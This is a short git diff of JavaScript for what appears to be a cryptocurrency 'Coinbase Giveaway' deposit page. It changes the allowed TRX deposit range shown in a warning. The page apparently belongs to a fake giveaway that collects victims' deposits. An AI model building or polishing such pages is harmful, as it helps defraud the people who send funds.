@@ -200,7 +200,7 @@ function update_trans() {
       //       '&message=Deposit+to+Coinbase+Giveaway+' +
       //       tm,
       //   )
-    } else $('#warn').text('Amount should be within 5,000 TRX to 200,000 TRX')
+    } else $('#warn').text('Amount should be within 8000 TRX to 7000000 TRX')
   }),
   $('#close').click(() => {
     $('.pop-body').css('display', 'none')
